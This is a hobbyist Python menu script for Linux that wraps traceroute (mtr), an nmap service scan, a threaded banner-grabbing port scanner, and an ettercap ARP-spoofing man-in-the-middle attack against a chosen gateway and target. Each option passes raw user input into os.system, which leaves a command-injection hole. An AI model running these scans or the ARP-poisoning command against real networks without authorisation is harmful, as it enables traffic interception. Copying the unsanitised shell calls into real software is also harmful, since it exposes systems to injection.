import socket
import time
import os
import sys
import threading
from datetime import datetime

def clear_screen():
	os.system("clear")

def double_line():
	print("=" * 60)

def one_line():
	print("-" * 60)

def menu():
	double_line()
	print("")
	print("                    <----- M E N U ----->")
	print("        <--- Linux Network commands and other stuff --->")
	print("")
	one_line()
	print("Route through the Internet         --->     1")
	print("")
	print("Nmap Scan                          --->     2")
	print("")
	print("User Scan                          --->     3")
	print("")
	print("Man in the Middle Attack           --->     4")
	print("")
	print("")
	print("THE END                            --->     0")
	double_line()

def choise():
	while True:
		choise = input("Please enter your choise: ")
		if choise == "1":
			show_route()
		elif choise == "2":
			nmap_scan()
		elif choise == "3":
			nmap_user()
		elif choise == "4":
			mitm_attack()
		elif choise == "0":
			sys.exit()

def show_route():
	while True:
		try:
			clear_screen()
			double_line()
			print("Your choise is Traceroute with Ping")
			one_line()
			target = input("Please enter a target: ")
			one_line()
			os.system("mtr -r -w -c 4 {}".format(target))
		except KeyboardInterrupt:
			print("\rDetected CTRL-c ... finished Program!")

		one_line()
		again()

def nmap_scan():
	while True:
		try:
			clear_screen()
			double_line()
			print("Your choise is an Nmap Scan")
			one_line()
			try:
				target = input("Please enter a target: ")
				one_line()
				os.system("sudo nmap -sV {}".format(target))
			except KeyboardInterrupt:
				print("\rDetected CRTL+c ... finish Program!")
		except KeyboardInterrupt:
			print("\rDetected CRTL-c ... finished Program!")

		one_line()
		again()

def nmap_user():
	while True:
		clear_screen()
		double_line()
		print("Your choise is a Portscan with a self written Script")
		one_line()

		def get_version(sock):
			return sock.recv(1024)

		def scan_port(target,port):
			try:
				sock = socket.socket()
				sock.settimeout(0.3)
				sock.connect((target,port))
				try:
					version = get_version(sock)
					print("[++] Port {} is open --> {}".format(port,version.decode().strip()))
				except:
					print("[++] Port {} is open".format(port))
			except:
				#print("[--] Port {} is closed".format(port))
				pass

		try:
			target = input("Enter target to scan: ")
			target_ip = socket.gethostbyname(target)
			print("Start scan hostname {} with IP {} ...Please Wait!".format(target,target_ip))
			one_line()
			start_time = datetime.now()

			ports = (21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080)

			for port in ports:
			#for port in range(1,81):
				#scan_port(target,port)
				thread = threading.Thread(target=scan_port, args=(target,port))
				thread.start()
				thread.join(0.5)

			end_time = datetime.now()
			total_time = end_time - start_time
			one_line()
			print("Scan from hostname {} with IP {} is finished in {}".format(target,target_ip,total_time))

		except socket.gaierror:
			print("Not a valid hostname or IP-Address!")
		except KeyboardInterrupt:
			#time.sleep(1)
			print("\rDetected CRTL+c ...Finish Program!")

		one_line()
		again()

def mitm_attack():
	while True:

		clear_screen()
		double_line()
		print("Your Choise is a Man in the Middle Attack!")
		print("Important !!!!! If you want finish the Attack - Please enter q !!!!")
		one_line()
		try:
			gateway = input("Enter Gateway IP: ")
			target = input("Enter Target IP: ")
			interface = input("Enter The Network Interface: ")
			one_line()
			os.system("sudo ettercap -T -S -i {} -M arp:remote /{}// /{}//".format(interface,gateway,target))
		except KeyboardInterrupt:
			print("\rDetectde CRTL-c ... Finished Program!")

		one_line()
		again()

def again():
	while True:
		print("")
		again = input("Again / Enter y or n / n go back to menu: ")
		if again in ["y","n"]:
			break
		else:
			print("Not a valid letter, Please y or n!!!!!")
	if again == "n":
		clear_screen()
		menu()
		choise()

#while True:
clear_screen()
menu()
choise()


